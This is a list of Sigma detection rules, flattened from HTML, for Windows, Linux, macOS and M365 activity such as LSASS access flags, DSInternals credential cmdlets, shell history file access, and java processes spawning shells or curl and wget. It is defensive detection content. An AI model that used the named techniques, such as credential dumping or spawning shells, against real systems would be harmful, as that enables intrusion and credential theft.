<li><a href="#">title:Suspicious Get Local Groups Information with WMIC id: 164eda96-11b2-430b-85ff-6a265c15bf32 status: experimental description: | Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group. references: - author: frack113 date: 2021/12/12 modified: 2022/05/13 logsource: product: windows category: process_creation detection: selection_img: - Image|endswith: '\wmic.exe' - OriginalFileName: 'wmic.exe' selection_cli: CommandLine|contains: ' group' condition: all of selection* falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1069.001 
<li><a href="#">title:Suspicious Get-ADDBAccount Usage id: b140afd9-474b-4072-958e-2ebb435abd68 description: Detects suspicious invocation of the Get-ADDBAccount script that reads from a ntds.dit file and may be used to get access to credentials without using any credential dumpers status: experimental author: Florian Roth date: 2022/03/16 references: - - tags: - attack.credential_access - attack.t1003.003 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection: Payload|contains|all: - 'Get-ADDBAccount' - 'BootKey ' - 'DatabasePath ' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Get-ADReplAccount id: 060c3ef1-fd0a-4091-bf46-e7d625f60b73 status: experimental description: The DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory. These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation. date: 2022/02/06 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - Get-ADReplAccount - '-All ' - '-Server ' condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.credential_access - attack.t1003.006 
<li><a href="#">title:Suspicious GetTypeFromCLSID ShellExecute id: 8bc063d5-3a3a-4f01-a140-bc15e55e8437 status: experimental description: Detects suspicious Powershell code that execute COM Objects date: 2022/04/02 author: frack113 references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - '::GetTypeFromCLSID(' - '.ShellExecute(' condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.privilege_escalation - attack.persistence - attack.t1546.015 
<li><a href="#">title:Suspicious Get-Variable.exe Creation id: 0c3fac91-5627-46e8-a6a8-a0d7b9b8ae1b status: experimental description: | Get-Variable is a valid PowerShell cmdlet WindowsApps is by default in the path where PowerShell is executed. So when the Get-Variable command is issued on PowerShell execution, the system first looks for the Get-Variable executable in the path and executes the malicious binary instead of looking for the PowerShell cmdlet. author: frack113 references: - - date: 2022/04/23 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: 'Local\Microsoft\WindowsApps\Get-Variable.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1546 - attack.defense_evasion - attack.t1027 
<li><a href="#">title:Suspicious Get-WmiObject id: 0332a266-b584-47b4-933d-a00b103e1b37 status: experimental description: The infrastructure for management data and operations that enables local and remote management of Windows personal computers and servers date: 2022/01/12 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - Get-WmiObject - gwmi condition: selection falsepositives: - Legitimate PowerShell scripts level: low tags: - attack.persistence - attack.t1546 
<li><a href="#">title:Suspicious GPO Discovery With Get-GPO id: eb2fd349-ec67-4caa-9143-d79c7fb34441 status: experimental description: Detect use of Get-GPO to get one GPO or all the GPOs in a domain. date: 2022/06/04 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: Get-GPO condition: selection falsepositives: - Legitimate PowerShell scripts level: low tags: - attack.discovery - attack.t1615 
<li><a href="#">title:Suspicious GrantedAccess Flags on LSASS Access id: a18dd26b-6450-46de-8c91-9659150cf088 related: - id: 32d0d3e2-e58d-4d41-926b-18b520b2b32d type: obsoletes status: experimental description: Detects process access to LSASS memory with suspicious access flags author: Florian Roth date: 2021/11/22 modified: 2022/06/20 references: - - - - - tags: - attack.credential_access - attack.t1003.001 - attack.s0002 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' GrantedAccess|endswith: # - '10' # covered in rule 678dfc63-fefb-47a5-a04c-26bcf8cc9f65 - '30' - '50' - '70' - '90' - 'B0' - 'D0' - 'F0' - '18' - '38' - '58' - '78' - '98' - 'B8' - 'D8' - 'F8' - '1A' - '3A' - '5A' - '7A' - '9A' - 'BA' - 'DA' - 'FA' - '0x14C2' # # Absolute paths to programs that cause false positives filter_absolute: SourceImage: - 'C:\WINDOWS\system32\taskmgr.exe' - 'C:\Program Files\Malwarebytes\Anti-Malware\MBAMService.exe' - 'C:\PROGRAMDATA\MALWAREBYTES\MBAMSERVICE\ctlrupdate\mbupdatr.exe' - 'C:\WINDOWS\system32\taskhostw.exe' - 'C:\Users\\*\AppData\Local\Programs\Microsoft VS Code\Code.exe' - 'C:\Program Files\Windows Defender\MsMpEng.exe' - 'C:\Windows\SysWOW64\msiexec.exe' - 'C:\Windows\System32\msiexec.exe' - 'C:\Windows\System32\lsass.exe' - 'C:\WINDOWS\System32\perfmon.exe' - 'C:\Windows\System32\MRT.exe' - 'C:\Program Files\Cisco\Cisco AnyConnect Secure Mobility Client\vpnagent.exe' - 'C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpnagent.exe' # Windows Defender filter1: SourceImage|startswith: 'C:\ProgramData\Microsoft\Windows Defender\' SourceImage|endswith: '\MsMpEng.exe' # VMware Tools filter2: SourceImage|startswith: 'C:\ProgramData\VMware\VMware Tools\' SourceImage|endswith: '\vmtoolsd.exe' # Antivirus and EDR agents filter3: SourceImage|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' SourceImage|contains: 'Antivirus' filter_mrt: SourceImage: 'C:\WINDOWS\system32\MRT.exe' GrantedAccess: '0x1418' filter_mcafee: SourceImage: 'C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.exe' filter_nextron: SourceImage|startswith: 'C:\Windows\Temp\asgard2-agent\' SourceImage|endswith: - '\thor64.exe' - '\thor.exe' GrantedAccess: '0x1fffff' filter_windefend2: CallTrace|contains|all: - '|C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{' - '}\mpengine.dll+' GrantedAccess: '0x1418' condition: selection and not 1 of filter* fields: - User - SourceImage - GrantedAccess falsepositives: - Legitimate software accessing LSASS process for legitimate reason level: high 
<li><a href="#">title:Suspicious GrpConv Execution id: f14e169e-9978-4c69-acb3-1cff8200bc36 status: experimental description: Detects the suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors author: Florian Roth date: 2022/05/19 tags: - attack.persistence - attack.t1547 references: - logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - 'grpconv.exe -o' - 'grpconv -o' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious GUP Usage id: 0a4f6091-223b-41f6-8743-f322ec84930b status: test description: Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks author: Florian Roth references: - date: 2019/02/06 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\GUP.exe' filter: Image|endswith: - '\Users\\*\AppData\Local\Notepad++\updater\GUP.exe' - '\Users\\*\AppData\Roaming\Notepad++\updater\GUP.exe' - '\Program Files\Notepad++\updater\GUP.exe' - '\Program Files (x86)\Notepad++\updater\GUP.exe' condition: selection and not filter falsepositives: - Execution of tools named GUP.exe and located in folders different than Notepad++\updater level: high tags: - attack.defense_evasion - attack.t1574.002 
<li><a href="#">title:'Suspicious History File Operations' id: 508a9374-ad52-4789-b568-fc358def2c65 status: test description: 'Detects commandline operations on shell history files' author: 'Mikhail Larin, oscd.community' references: - date: 2020/10/17 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection: CommandLine|contains: - '.bash_history' - '.zsh_history' - '.zhistory' - '.history' - '.sh_history' - 'fish_history' condition: selection falsepositives: - Legitimate administrative activity - Legitimate software, cleaning hist file level: medium tags: - attack.credential_access - attack.t1552.003 
<li><a href="#">title:'Suspicious History File Operations' id: eae8ce9f-bde9-47a6-8e79-f20d18419910 status: test description: 'Detects commandline operations on shell history files' author: 'Mikhail Larin, oscd.community' references: - date: 2020/10/17 modified: 2021/11/27 logsource: product: linux service: auditd detection: execve: type: EXECVE history: - '.bash_history' - '.zsh_history' - '.zhistory' - '.history' - '.sh_history' - 'fish_history' condition: execve and history fields: - a0 - a1 - a2 - a3 - key falsepositives: - Legitimate administrative activity - Legitimate software, cleaning hist file level: medium tags: - attack.credential_access - attack.t1552.003 
<li><a href="#">title:Suspicious HWP Sub Processes id: 023394c4-29d5-46ab-92b8-6a534c6f447b status: test description: Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation author: Florian Roth references: - - - - - (word_processor) date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\Hwp.exe' Image|endswith: '\gbb.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1566.001 - attack.execution - attack.t1203 - attack.t1059.003 - attack.g0032 
<li><a href="#">title:Suspicious Hyper-V Cmdlets id: 42d36aa1-3240-4db0-8257-e0118dcdd9cd status: experimental description: Adversaries may carry out malicious operations using a virtual instance to avoid detection date: 2022/04/09 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - New-VM - Set-VMFirmware - Start-VM condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.defense_evasion - attack.t1564.006 
<li><a href="#">title:Suspicious Inbox Forwarding id: 6c220477-0b5b-4b25-bb90-66183b4089e8 status: experimental description: Detects when a Microsoft Cloud App Security reported suspicious email forwarding rules, for example, if a user created an inbox rule that forwards a copy of all emails to an external address. author: Austin Songer @austinsonger date: 2021/08/22 references: - - logsource: service: threat_management product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: 'Suspicious inbox forwarding' status: success condition: selection falsepositives: - Unknown level: low tags: - attack.exfiltration - attack.t1020 
<li><a href="#">title:Suspicious In-Memory Module Execution id: 5f113a8f-8b61-41ca-b90f-d374fa7e4a39 description: Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display "UNKNOWN" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --> kernelbase.dll --> unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious. status: experimental date: 2019/10/27 modified: 2022/03/16 author: Perez Diego (@darkquassar), oscd.community, Jonhnathan Ribeiro references: - tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1055.001 - attack.t1055.002 logsource: category: process_access product: windows detection: selection1: CallTrace|contains|all: - 'C:\WINDOWS\SYSTEM32\ntdll.dll+' - '|C:\WINDOWS\System32\KERNELBASE.dll+' - '|UNKNOWN(' - ')' selection2: CallTrace|contains|all: - 'UNKNOWN(' - ')|UNKNOWN(' CallTrace|endswith: ')' selection3: CallTrace|contains: 'UNKNOWN' GrantedAccess: - '0x1F0FFF' - '0x1F1FFF' - '0x143A' - '0x1410' - '0x1010' - '0x1F2FFF' - '0x1F3FFF' - '0x1FFFFF' filter: - SourceImage|endswith: - '\Windows\System32\sdiagnhost.exe' - '\procexp64.exe' - '\procexp.exe' - '\Microsoft VS Code\Code.exe' - '\aurora-agent-64.exe' - '\aurora-agent.exe' - '\git\usr\bin\sh.exe' - '\IDE\devenv.exe' - '\GitHubDesktop\Update.exe' - '\RuntimeBroker.exe' - '\backgroundTaskHost.exe' - '\GitHubDesktop.exe' - SourceImage|startswith: - 'C:\Program Files (x86)\' - 'C:\Program Files\' - 'C:\Windows\Microsoft.NET\Framework\\*\NGenTask.exe' - 'C:\Program Files (x86)\Microsoft Visual Studio\' - 'C:\Program Files\Microsoft Visual Studio\' - 'C:\Windows\Microsoft.NET\Framework' - 'C:\WINDOWS\System32\DriverStore\' - 'C:\Windows\System32\WindowsPowerShell\' - SourceImage: - 'C:\Users\\*\AppData\Local\Programs\Microsoft VS Code\Code.exe' - 'C:\WINDOWS\system32\taskhostw.exe' - 'C:\WINDOWS\system32\ctfmon.exe' - 'C:\WINDOWS\system32\NhNotifSys.exe' - 'C:\Windows\ImmersiveControlPanel\SystemSettings.exe' - 'C:\Windows\explorer.exe' - TargetImage: 'C:\Windows\System32\RuntimeBroker.exe' - TargetImage|endswith: '\Microsoft VS Code\Code.exe' - CallTrace|contains: '|C:\WINDOWS\System32\RPCRT4.dll+' # attempt to save the rule with a broader filter filter_set_1: SourceImage: 'C:\WINDOWS\Explorer.EXE' TargetImage: - 'C:\WINDOWS\system32\backgroundTaskHost.exe' - 'C:\WINDOWS\explorer.exe' filter_msmpeng: SourceImage|startswith: 'C:\ProgramData\Microsoft\Windows Defender\Platform\' SourceImage|endswith: '\MsMpEng.exe' filter_eclipse: SourceImage|endswith: '\eclipse.exe' CallTrace|contains: - '\jre\bin\java.dll' - '|C:\Windows\SYSTEM32\windows.storage.dll+' - '\configuration\org.eclipse.osgi\' filter_openwith: SourceImage: 'C:\Windows\system32\OpenWith.exe' TargetImage: 'C:\Windows\Explorer.EXE' condition: ( selection1 or selection2 or selection3 ) and not 1 of filter* fields: - ComputerName - User - SourceImage - TargetImage - CallTrace level: low # too many false positives, really sad, but the amount of false positives with all kinds of software is just too high falsepositives: - SysInternals Process Explorer 
<li><a href="#">title:Suspicious Interactive PowerShell as SYSTEM id: 5b40a734-99b6-4b98-a1d0-1cea51a08ab2 status: experimental description: Detects the creation of files that indicator an interactive use of PowerShell in the SYSTEM user context author: Florian Roth references: - date: 2021/12/07 logsource: product: windows category: file_event detection: selection: TargetFilename: - 'C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' - 'C:\Windows\System32\config\systemprofile\AppData\\Local\Microsoft\Windows\PowerShell\StartupProfileData-Interactive' condition: selection falsepositives: - Administrative activity - PowerShell scripts running as SYSTEM user level: high 
<li><a href="#">title:Suspicious Invoke-Item From Mount-DiskImage id: 902cedee-0398-4e3a-8183-6f3a89773a96 status: experimental description: Adversaries may abuse container files such as disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. date: 2022/02/01 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Mount-DiskImage ' - '-ImagePath ' - Get-Volume - '.DriveLetter' - 'invoke-item ' - '):\' condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.defense_evasion - attack.t1553.005 
<li><a href="#">title:Suspicious IO.FileStream id: 70ad982f-67c8-40e0-a955-b920c2fa05cb status: experimental description: Open a handle on the drive volume via the \\.\ DOS device path specifier and perform direct access read of the first few bytes of the volume. date: 2022/01/09 modified: 2022/03/05 author: frack113 references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - New-Object - IO.FileStream - '\\\\.\\' condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.defense_evasion - attack.t1070.003 
<li><a href="#">title:Suspicious Java Children Processes id: d292e0af-9a18-420c-9525-ec0ac3936892 status: experimental description: Detects java process spawning suspicious children author: Nasreddine Bencherchali date: 2022/06/03 references: - tags: - attack.execution - attack.t1059 logsource: category: process_creation product: linux detection: selection: ParentImage|endswith: '/java' CommandLine|contains: - '/bin/sh' - 'bash' - 'dash' - 'ksh' - 'zsh' - 'csh' - 'fish' - 'curl' - 'wget' - 'python' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Kerberos RC4 Ticket Encryption id: 496a0e47-0a33-4dca-b009-9e6ca3591f39 status: experimental references: - - tags: - attack.credential_access - attack.t1558.003 description: Detects service ticket requests using RC4 encryption type author: Florian Roth date: 2017/02/06 modified: 2022/06/19 logsource: product: windows service: security detection: selection: EventID: 4769 TicketOptions: '0x40810000' TicketEncryptionType: '0x17' reduction: ServiceName|endswith: '$' condition: selection and not reduction falsepositives: - Service accounts used on legacy systems (e.g. NetApp) - Windows Domains with DFL 2003 and legacy systems level: medium 
<li><a href="#">title:Suspicious Kernel Dump Using Dtrace id: 7124aebe-4cd7-4ccb-8df0-6d6b93c96795 status: experimental description: Detects suspicious way to dump the kernel on Windows systems using dtrace.exe, which is available on Windows systems since Windows 10 19H1 author: Florian Roth date: 2021/12/28 references: - - logsource: product: windows category: process_creation detection: selection_plain: Image|endswith: '\dtrace.exe' CommandLine|contains: 'lkd(0)' selection_obfuscated: CommandLine|contains|all: - 'syscall:::return' - 'lkd(' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Key Manager Access id: a4694263-59a8-4608-a3a0-6f8d3a51664c description: Detects the invocation of the Stored User Names and Passwords dialogue (Key Manager) status: experimental references: - author: Florian Roth date: 2022/04/21 tags: - attack.credential_access - attack.t1555.004 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rundll32.exe' CommandLine|contains|all: - 'keymgr' - 'KRShowKeyMgr' condition: selection falsepositives: - Administrative activity level: high 
<li><a href="#">title:Suspicious LDAP-Attributes Used id: d00a9a72-2c09-4459-ad03-5e0a23351e36 status: test description: Detects the usage of particular AttributeLDAPDisplayNames, which are known for data exchange via LDAP by the tool LDAPFragger and are additionally not commonly used in companies. author: xknow @xknow_infosec references: - - - date: 2019/03/24 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5136 AttributeValue: '*' AttributeLDAPDisplayName: - 'primaryInternationalISDNNumber' - 'otherFacsimileTelephoneNumber' - 'primaryTelexNumber' condition: selection falsepositives: - Companies, who may use these default LDAP-Attributes for personal information level: high tags: - attack.t1001.003 - attack.command_and_control 
<li><a href="#">title:Suspicious Listing of Network Connections id: 1c67a717-32ba-409b-a45d-0fb704a73a81 status: experimental description: Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. references: - author: frack113 date: 2021/12/10 modified: 2021/12/13 logsource: category: process_creation product: windows detection: netstat: CommandLine|contains: netstat net_cmd: CommandLine|contains: 'net ' net_opt: - CommandLine|endswith: - ' use' - ' sessions' - CommandLine|contains: - ' use ' - ' sessions ' condition: netstat or (net_cmd and net_opt) falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1049 
<li><a href="#">title:Suspicious Load DLL via CertOC.exe id: 242301bc-f92f-4476-8718-78004a6efd9f description: Detects when a user installs certificates by using CertOC.exe to loads the target DLL file. status: experimental author: Austin Songer @austinsonger date: 2021/10/23 modified: 2022/05/16 references: - logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\certoc.exe' - OriginalFileName: 'CertOC.exe' selection_cli: CommandLine|contains|all: - '-LoadDLL' - '.dll' condition: all of selection* fields: - CommandLine - ParentCommandLine tags: - attack.defense_evasion - attack.t1218 falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious Load of Advapi31.dll id: d813d662-785b-42ca-8b4a-f7457d78d5a9 status: experimental description: Detects the load of advapi31.dll by a process running in an uncommon folder author: frack113 references: - date: 2022/02/03 modified: 2022/02/11 logsource: product: windows category: image_load detection: selection: ImageLoaded|endswith: '\advapi32.dll' filter_common: Image|startswith: - 'C:\Windows\' - 'C:\Program Files (x86)\' - 'C:\Program Files\' filter_defender: Image|startswith: 'C:\ProgramData\Microsoft\Windows Defender\platform\' Image|endswith: '\MpCmdRun.exe' filter_onedrive: Image|startswith: 'C:\Users\' Image|contains: '\AppData\Local\Microsoft\OneDrive\' Image|endswith: 'FileCoAuth.exe' condition: selection and not 1 of filter_* falsepositives: - Unknown level: informational tags: - attack.defense_evasion - attack.t1070 
<li><a href="#">title:Suspicious Log Entries id: f64b6e9a-5d9d-48a5-8289-e1dd2b3876e1 status: test description: Detects suspicious log entries in Linux log files author: Florian Roth date: 2017/03/25 modified: 2021/11/27 logsource: product: linux detection: keywords: - entered promiscuous mode - Deactivating service - Oversized packet received from - imuxsock begins to drop messages condition: keywords falsepositives: - Unknown level: medium tags: - attack.impact 
<li><a href="#">title:Suspicious LOLBIN AccCheckConsole id: 0f6da907-5854-4be6-859a-e9958747b0aa status: experimental description: Detects suspicious LOLBIN AccCheckConsole execution with parameters as used to load an arbitrary DLL references: - - - author: Florian Roth date: 2022/01/06 tags: - attack.execution logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\AccCheckConsole.exe' - OriginalFileName: 'AccCheckConsole.exe' selection_cli: CommandLine|contains|all: - ' -window ' - '.dll' condition: all of selection* falsepositives: - Legitimate use of the UI Accessibility Checker level: high 
<li><a href="#">title:Suspicious LSASS Access Via MalSecLogon id: 472159c5-31b9-4f56-b794-b766faa8b0a7 status: experimental description: Detects suspicious access to Lsass handle via a call trace to "seclogon.dll" author: Samir Bousseaden (original elastic rule), Nasreddine Bencherchali (sigma) references: - - - date: 2022/06/29 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' SourceImage|endswith: '\svchost.exe' GrantedAccess: '0x14c0' CallTrace|contains: 'seclogon.dll' condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1003.001 
<li><a href="#">title:Suspicious LSASS Process Clone id: c8da0dfd-4ed0-4b68-962d-13c9c884384e status: experimental description: Detects a suspicious LSASS process process clone that could be a sign of process dumping activity references: - - - tags: - attack.credential_access - attack.t1003 - attack.t1003.001 author: Florian Roth, Samir Bousseaden date: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\Windows\System32\lsass.exe' ParentImage|endswith: '\Windows\System32\lsass.exe' condition: selection falsepositives: - Unknown level: critical 
<li><a href="#">title:Suspicious MacOS Firmware Activity id: 7ed2c9f7-c59d-4c82-a7e2-f859aa676099 status: experimental description: Detects when a user manipulates with Firmward Password on MacOS. NOTE - this command has been disabled on silicon-based apple computers. author: Austin Songer @austinsonger date: 2021/09/30 references: - - - logsource: category: process_creation product: macos detection: selection1: Image: '/usr/sbin/firmwarepasswd' CommandLine|contains: - 'setpasswd' - 'full' - 'delete' - 'check' condition: selection1 falsepositives: - Legitimate administration activities level: medium tags: - attack.impact 
<li><a href="#">title:Suspicious Minimized MSEdge Start id: 94771a71-ba41-4b6e-a757-b531372eaab6 description: Detects the suspicious minimized start of MsEdge browser, which can be used to download files from the Internet status: experimental author: Florian Roth date: 2022/01/11 references: - tags: - attack.command_and_control - attack.t1105 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: 'start /min msedge' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Software that uses MsEdge to download components in the background (see ParentImage, ParentCommandLine) level: high 
<li><a href="#">title:Suspicious Mount-DiskImage id: 29e1c216-6408-489d-8a06-ee9d151ef819 status: experimental description: Adversaries may abuse container files such as disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. date: 2022/02/01 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Mount-DiskImage ' - '-ImagePath ' condition: selection falsepositives: - Legitimate PowerShell scripts level: low tags: - attack.defense_evasion - attack.t1553.005 
<li><a href="#">title:Suspicious MSExchangeMailboxReplication ASPX Write id: 7280c9f3-a5af-45d0-916a-bc01cb4151c9 status: experimental description: Detects suspicious activity in which the MSExchangeMailboxReplication process writes .asp and .apsx files to disk, which could be a sign of ProxyShell exploitation references: - author: Florian Roth date: 2022/02/25 tags: - attack.initial_access - attack.t1190 - attack.persistence - attack.t1505.003 logsource: product: windows category: file_event detection: selection: Image|endswith: '\MSExchangeMailboxReplication.exe' TargetFilename|endswith: - '.aspx' - '.asp' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious MSHTA Process Patterns id: e32f92d1-523e-49c3-9374-bdb13b46a3ba status: experimental description: Detects suspicious mshta process patterns references: - - - tags: - attack.execution - attack.t1106 author: Florian Roth date: 2021/07/17 logsource: category: process_creation product: windows detection: # Binary Selector selection_base: Image|endswith: '\mshta.exe' # Suspicious parents selection1: ParentImage|endswith: - '\cmd.exe' - '\powershell.exe' # Suspicious folders selection2: CommandLine|contains: - '\AppData\Local' - 'C:\Windows\Temp' - 'C:\Users\Public' # Suspicious Execution Locations filter3: Image|contains: - 'C:\Windows\System32' - 'C:\Windows\SysWOW64' # Suspicious extensions filter4: CommandLine|contains: - '.htm' - '.hta' CommandLine|endswith: - 'mshta.exe' - 'mshta' condition: selection_base and ( selection1 or selection2 ) or ( selection_base and not filter3 ) or ( selection_base and not filter4 ) falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious MsiExec Directory id: e22a6eb2-f8a5-44b5-8b44-a2dbd47b1144 status: test description: Detects suspicious msiexec process starts in an uncommon directory author: Florian Roth references: - date: 2019/11/14 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\msiexec.exe' filter: Image|startswith: - 'C:\Windows\System32\' - 'C:\Windows\SysWOW64\' - 'C:\Windows\WinSxS\' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1036.005 
<li><a href="#">title:Suspicious MsiExec Embedding Parent id: 4a2a2c3e-209f-4d01-b513-4155a540b469 status: experimental description: Adversaries may abuse msiexec.exe to proxy the execution of malicious payloads references: - author: frack113 date: 2022/04/16 modified: 2022/06/30 logsource: product: windows category: process_creation detection: selection: Image|endswith: - '\powershell.exe' - '\cmd.exe' ParentCommandLine|contains|all: - 'MsiExec.exe' - '-Embedding ' filter_splunk_ufw: Image|endswith: ':\Windows\System32\cmd.exe' CommandLine|contains: 'C:\Program Files\SplunkUniversalForwarder\bin\' condition: selection and not 1 of filter* falsepositives: - Unknown level: medium tags: - attack.t1218.007 - attack.defense_evasion 
<li><a href="#">title:Suspicious Msiexec Execute Arbitrary DLL id: 6f4191bb-912b-48a8-9ce7-682769541e6d status: experimental description: | Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi) author: frack113 date: 2022/01/16 modified: 2022/03/28 references: - - logsource: category: process_creation product: windows detection: selection: Image|endswith: '\msiexec.exe' CommandLine|contains: ' /y' filter_apple: CommandLine|contains: - '\MsiExec.exe" /Y "C:\Program Files\Bonjour\mdnsNSP.dll' - '\MsiExec.exe" /Y "C:\Program Files (x86)\Bonjour\mdnsNSP.dll' - '\MsiExec.exe" /Y "C:\Program Files (x86)\Apple Software Update\ScriptingObjectModel.dll' - '\MsiExec.exe" /Y "C:\Program Files (x86)\Apple Software Update\SoftwareUpdateAdmin.dll' - '\MsiExec.exe" /Y "C:\Windows\CCM\' - '\MsiExec.exe" /Y C:\Windows\CCM\' #also need non-quoted execution condition: selection and not 1 of filter_* falsepositives: - Legitimate script level: medium tags: - attack.defense_evasion - attack.t1218.007 
<li><a href="#">title:Suspicious Msiexec Load DLL id: 84f52741-8834-4a8c-a413-2eb2269aa6c8 status: experimental description: Detects MsiExec loading a DLL and calling its DllUnregisterServer function references: - - author: frack113 date: 2022/04/24 logsource: product: windows category: process_creation detection: selection: Image|endswith: '\msiexec.exe' CommandLine|contains|all: - ' /z ' - '.dll' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218.007 
<li><a href="#">title:Suspicious Msiexec Quiet Install id: 79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5 status: experimental description: | Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi) author: frack113 date: 2022/01/16 references: - - logsource: category: process_creation product: windows detection: selection: Image|endswith: '\msiexec.exe' CommandLine|contains|all: - ' /i' - ' /q' condition: selection falsepositives: - Legitimate script level: low tags: - attack.defense_evasion - attack.t1218.007 
<li><a href="#">title:Suspicious Multiple File Rename Or Delete Occurred id: 97919310-06a7-482c-9639-92b67ed63cf8 status: test description: Detects multiple file rename or delete events occurrence within a specified period of time by a same user (these events may signalize about ransomware activity). author: Vasiliy Burov, oscd.community references: - date: 2020/10/16 modified: 2021/11/27 logsource: product: windows service: security definition: 'Requirements: Audit Policy : Policies/Windows Settings/Security Settings/Local Policies/Audit Policy/Audit object access, Policies/Windows Settings/Security Settings/Advanced Audit Policy Configuration/Object Access' detection: selection: EventID: 4663 ObjectType: 'File' AccessList: '%%1537' Keywords: '0x8020000000000000' timeframe: 30s condition: selection falsepositives: - Software uninstallation - Files restore activities level: medium tags: - attack.impact - attack.t1486 
<li><a href="#">title:Suspicious Named Error id: c8e35e96-19ce-4f16-aeb6-fd5588dc5365 status: test description: Detects suspicious DNS error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts author: Florian Roth references: - date: 2018/02/20 modified: 2021/11/27 logsource: product: linux service: syslog detection: keywords: - '* dropping source port zero packet from *' - '* denied AXFR from *' - '* exiting (due to fatal error)*' condition: keywords falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:Suspicious Netsh Discovery Command id: 0e4164da-94bc-450d-a7be-a4b176179f1f status: experimental description: Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems references: - author: frack113, Christopher Peacock '@securepeacock', SCYTHE '@scythe_io' date: 2021/12/07 modified: 2022/04/11 logsource: category: process_creation product: windows detection: network_cmd1: CommandLine|contains|all: - 'netsh ' - 'show ' - 'firewall ' network_cmd2: CommandLine|contains: - 'config ' - 'state ' - 'rule ' - 'name=all' condition: all of network_cmd* falsepositives: - Administrative activity level: low tags: - attack.discovery - attack.t1016 
